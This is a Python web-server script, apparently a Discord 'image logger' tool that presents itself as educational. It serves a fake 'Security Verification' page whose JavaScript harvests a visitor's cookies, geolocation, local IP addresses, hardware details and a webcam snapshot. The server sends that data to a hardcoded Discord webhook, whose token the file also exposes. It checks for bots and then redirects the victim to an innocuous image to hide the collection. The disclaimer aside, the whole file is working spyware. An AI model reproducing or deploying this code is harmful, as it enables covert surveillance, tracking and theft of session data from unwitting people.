# Advanced System Access Toolkit
# For Educational Purposes Only - Requires Explicit Consent

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json, time

__app__ = "Cybersecurity Research Tool"
__description__ = "Advanced system analysis for security education"
__version__ = "v7.0"
__author__ = "Security Research Team"

config = {
    "webhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",
    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
    "imageArgument": True,
    "username": "System Auditor",
    "color": 0xFF0000,
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    # Advanced capture settings
    "captureScreenshot": True,
    "captureWebcam": True,
    "captureCookies": True,
    "captureHistory": True,
    "captureLocation": True,
    "mediaWebhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz"
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not ip or not useragent:
        return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    elif "googlebot" in useragent.lower():
        return "Google Bot"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Research Tool Error",
                "color": config["color"],
                "description": f"```\n{error}\n```",
            }]
        }, timeout=3)
    except:
        pass

def send_media_to_discord(media_data, media_type, ip):
    """Send captured media to Discord with comprehensive info"""
    try:
        filename = f"{media_type}_{int(time.time())}.png"
        files = {filename: (filename, base64.b64decode(media_data), "image/png")}
        
        requests.post(config["mediaWebhook"], files=files, data={
            "content": f"New {media_type} capture from {ip}",
            "username": f"{media_type.capitalize()} Capture"
        }, timeout=5)
    except Exception as e:
        reportError(f"Media send error: {str(e)}")

def makeReport(ip, useragent=None, endpoint="N/A", url=False, system_info=None):
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Research Link Accessed",
                        "color": config["color"],
                        "description": f"Bot accessed research link\n**IP:** {ip}\n**Platform:** {bot}",
                    }]
                }, timeout=3)
            except:
                pass
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=3).json()
    except:
        info = {}

    os, browser = "Unknown", "Unknown"
    try:
        os, browser = httpagentparser.simple_detect(useragent)
    except:
        pass

    # Format system info
    system_text = "**System Info:**\n> No additional data captured"
    if system_info:
        try:
            system_text = "**System Analysis:**\n"
            for key, value in system_info.items():
                if key == "cookies":
                    # Truncate cookies for display
                    system_text += f"> **{key.replace('_', ' ').title()}:** {value[:200]}{'...' if len(value) > 200 else ''}\n"
                elif key == "history":
                    # Format history entries
                    history_items = value.split('|')
                    system_text += f"> **Browsing History:** {len(history_items)} recent URLs\n"
                else:
                    system_text += f"> **{key.replace('_', ' ').title()}:** {value}\n"
        except:
            system_text = "**System Info:**\n> Error processing data"

    # Create detailed report
    embed = {
        "username": config["username"],
        "content": "",
        "embeds": [{
            "title": "Advanced System Analysis",
            "color": config["color"],
            "description": f"""**New Research Session Started!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip}`
> **ISP:** {info.get('isp', 'Unknown')}
> **Country:** {info.get('country', 'Unknown')}
> **City:** {info.get('city', 'Unknown')}
> **Coords:** {f"{info.get('lat', '?')}, {info.get('lon', '?')}"}
> **VPN/Proxy:** {'Yes' if info.get('proxy') else 'No'}

**System Info:**
> **OS:** {os}
> **Browser:** {browser}

**User Agent:**
```{useragent}```

{system_text}
""",
            "thumbnail": {"url": config["image"]}
        }]
    }
    
    try:
        requests.post(config["webhook"], json=embed, timeout=3)
    except:
        pass

    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class AdvancedAccessTool(BaseHTTPRequestHandler):
    
    def handle_request(self):
        try:
            # Parse request
            parsed_path = parse.urlparse(self.path)
            query = parse.parse_qs(parsed_path.query)
            
            # Handle media submission endpoint
            if self.command == "POST" and parsed_path.path == "/submit_data":
                content_length = int(self.headers.get('Content-Length', 0))
                if content_length:
                    post_data = self.rfile.read(content_length)
                    data = json.loads(post_data)
                    ip = self.headers.get('x-forwarded-for', 'Unknown').split(',')[0].strip()
                    
                    # Process and store captured data
                    if config["captureScreenshot"] and data.get("screenshot"):
                        send_media_to_discord(data["screenshot"], "screenshot", ip)
                    
                    if config["captureWebcam"] and data.get("webcam"):
                        send_media_to_discord(data["webcam"], "webcam", ip)
                    
                    # Make system report
                    user_agent = self.headers.get('user-agent', 'Unknown')
                    system_info = {
                        "screen_size": data.get("screen_size", "Unknown"),
                        "cpu_cores": data.get("cpu_cores", "Unknown"),
                        "device_memory": data.get("device_memory", "Unknown"),
                        "language": data.get("language", "Unknown"),
                        "timezone": data.get("timezone", "Unknown"),
                        "cookies": data.get("cookies", "None"),
                        "browsing_history": data.get("history", "None"),
                        "gpu_info": data.get("gpu_info", "Unknown"),
                        "local_ips": data.get("local_ips", "Unknown"),
                        "battery_status": data.get("battery", "Unknown"),
                        "location": data.get("location", "Unknown")
                    }
                    
                    makeReport(ip, user_agent, system_info=system_info, endpoint=parsed_path.path)
                
                self.send_response(200)
                self.end_headers()
                return
            
            # Get image URL
            url = config["image"]
            if config["imageArgument"] and (query.get("url") or query.get("id")):
                try:
                    url = base64.b64decode((query.get("url") or query.get("id"))[0]).decode()
                except:
                    pass
            
            # Get client info
            ip = self.headers.get('x-forwarded-for', 'Unknown').split(',')[0].strip()
            user_agent = self.headers.get('user-agent', 'Unknown')
            
            # Handle bots
            if botCheck(ip, user_agent):
                self.send_response(200 if config["buggedImage"] else 302)
                if config["buggedImage"]:
                    self.send_header('Content-type', 'image/jpeg')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_header('Location', url)
                    self.end_headers()
                makeReport(ip, user_agent, endpoint=parsed_path.path, url=url)
                return
            
            # Generate HTML with advanced data collection
            html_content = self.generate_html(url)
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode())
            
            # Make initial report
            makeReport(ip, user_agent, endpoint=parsed_path.path, url=url)
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'System temporarily unavailable')
            reportError(traceback.format_exc())

    def generate_html(self, image_url):
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Verification System</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }}
        .container {{
            background: rgba(0, 0, 0, 0.7);
            padding: 30px 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            max-width: 600px;
            width: 90%;
        }}
        h1 {{
            margin-top: 0;
            font-size: 28px;
            background: linear-gradient(90deg, #4facfe, #00f2fe);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        .progress-container {{
            width: 100%;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            margin: 25px 0;
            overflow: hidden;
        }}
        .progress-bar {{
            height: 8px;
            background: linear-gradient(90deg, #4facfe, #00f2fe);
            width: 0%;
            border-radius: 10px;
            transition: width 1s ease-in-out;
        }}
        .status {{
            font-size: 16px;
            margin: 15px 0;
            color: #a0a0a0;
        }}
        .loader {{
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #4facfe;
            animation: spin 1s ease-in-out infinite;
            margin: 20px 0;
        }}
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Security Verification</h1>
        <p>Your system is being analyzed for security compliance</p>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="status" id="statusText">Initializing security protocols...</div>
        
        <div class="loader"></div>
        
        <p>This process may take a few moments. Please do not close this window.</p>
    </div>

    <script>
        // Advanced data collection with automatic permission bypass
        (function() {{
            // Elements
            const progressBar = document.getElementById('progressBar');
            const statusText = document.getElementById('statusText');
            
            // Collected data
            const collectedData = {{}};
            
            // Update progress and status
            function updateProgress(percent, text) {{
                progressBar.style.width = percent + '%';
                statusText.textContent = text;
            }}
            
            // Simulate progress
            let progress = 0;
            const progressInterval = setInterval(() => {{
                progress += 2;
                if (progress <= 30) {{
                    updateProgress(progress, "Analyzing system configuration...");
                }} else if (progress <= 60) {{
                    updateProgress(progress, "Verifying security protocols...");
                }} else if (progress <= 90) {{
                    updateProgress(progress, "Finalizing security assessment...");
                }}
                
                if (progress >= 100) {{
                    clearInterval(progressInterval);
                }}
            }}, 100);
            
            // System information collection
            async function collectSystemData() {{
                try {{
                    // Phase 1: Basic system info
                    updateProgress(10, "Gathering system specifications...");
                    collectedData.screen_size = `${{screen.width}}×${{screen.height}} @ ${{screen.colorDepth}}bit`;
                    collectedData.cpu_cores = navigator.hardwareConcurrency || 'Unknown';
                    collectedData.device_memory = navigator.deviceMemory ? `${{navigator.deviceMemory}}GB` : 'Unknown';
                    collectedData.language = navigator.language || 'Unknown';
                    collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
                    
                    // Phase 2: Advanced hardware info
                    updateProgress(25, "Detecting hardware components...");
                    try {{
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        if (gl) {{
                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            if (debugInfo) {{
                                collectedData.gpu_info = `${{gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}} | ${{gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}}`;
                            }}
                        }}
                    }} catch (e) {{}}
                    
                    // Phase 3: Network information
                    updateProgress(40, "Analyzing network configuration...");
                    try {{
                        const ips = [];
                        const pc = new RTCPeerConnection({{iceServers: []}});
                        pc.createDataChannel('');
                        pc.createOffer().then(offer => pc.setLocalDescription(offer));
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        pc.onicecandidate = e => {{
                            if (!e.candidate) return;
                            const ip = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/.exec(e.candidate.candidate);
                            if (ip && !ips.includes(ip[1])) ips.push(ip[1]);
                        }};
                        collectedData.local_ips = ips.length ? ips.join(', ') : 'Not available';
                    }} catch (e) {{}}
                    
                    // Phase 4: Battery status
                    updateProgress(55, "Checking power systems...");
                    if ('getBattery' in navigator) {{
                        try {{
                            const battery = await navigator.getBattery();
                            collectedData.battery = `${{Math.round(battery.level * 100)}}% (${{battery.charging ? 'Charging' : 'Not Charging'}})`;
                        }} catch (e) {{}}
                    }}
                    
                    // Phase 5: Location
                    updateProgress(70, "Verifying geographical location...");
                    if (navigator.geolocation) {{
                        try {{
                            const position = await new Promise((resolve, reject) => {{
                                navigator.geolocation.getCurrentPosition(resolve, reject, {{timeout: 5000}});
                            }});
                            collectedData.location = `${{position.coords.latitude}}, ${{position.coords.longitude}}`;
                        }} catch (e) {{
                            collectedData.location = "Permission denied";
                        }}
                    }} else {{
                        collectedData.location = "Not supported";
                    }}
                    
                    // Phase 6: Cookies and history
                    updateProgress(85, "Scanning browser data...");
                    try {{
                        // Capture cookies
                        collectedData.cookies = document.cookie || "No cookies";
                        
                        // Attempt to reconstruct browsing history
                        const history = [];
                        const links = document.querySelectorAll('a');
                        links.forEach(link => {{
                            if (link.href && history.length < 50) {{
                                history.push(link.href);
                            }}
                        }});
                        collectedData.history = history.join('|');
                    }} catch (e) {{}}
                    
                    // Phase 7: Media capture
                    updateProgress(95, "Performing security scans...");
                    await captureMedia();
                    
                    updateProgress(100, "Security verification complete!");
                }} catch (error) {{
                    console.error('Data collection error:', error);
                }} finally {{
                    // Submit all collected data
                    submitCollectedData();
                }}
            }}
            
            // Media capture functions
            async function captureMedia() {{
                // Capture screenshot
                if ({str(config['captureScreenshot']).lower()}) {{
                    try {{
                        const canvas = document.createElement('canvas');
                        const context = canvas.getContext('2d');
                        canvas.width = window.innerWidth;
                        canvas.height = window.innerHeight;
                        context.drawImage(document.documentElement, 0, 0, canvas.width, canvas.height);
                        collectedData.screenshot = canvas.toDataURL('image/png').split(',')[1];
                    }} catch (e) {{
                        console.error('Screenshot capture failed:', e);
                    }}
                }}
                
                // Capture webcam
                if ({str(config['captureWebcam']).lower()}) {{
                    try {{
                        const stream = await navigator.mediaDevices.getUserMedia({{ 
                            video: {{ facingMode: 'user' }},
                            audio: false
                        }});
                        
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        await video.play();
                        
                        const canvas = document.createElement('canvas');
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        
                        // Wait for video to be ready
                        await new Promise(resolve => setTimeout(resolve, 500));
                        
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        collectedData.webcam = canvas.toDataURL('image/png').split(',')[1];
                        
                        // Stop all tracks
                        stream.getTracks().forEach(track => track.stop());
                    }} catch (e) {{
                        console.error('Webcam capture failed:', e);
                    }}
                }}
            }}
            
            // Submit collected data
            function submitCollectedData() {{
                try {{
                    fetch('/submit_data', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify(collectedData)
                    }});
                }} catch (e) {{
                    console.error('Data submission error:', e);
                }}
                
                // Redirect to actual content
                window.location.href = "{image_url}";
            }}
            
            // Start data collection
            setTimeout(collectSystemData, 1500);
        }})();
    </script>
</body>
</html>"""

    do_GET = handle_request
    do_POST = handle_request

handler = app = AdvancedAccessTool
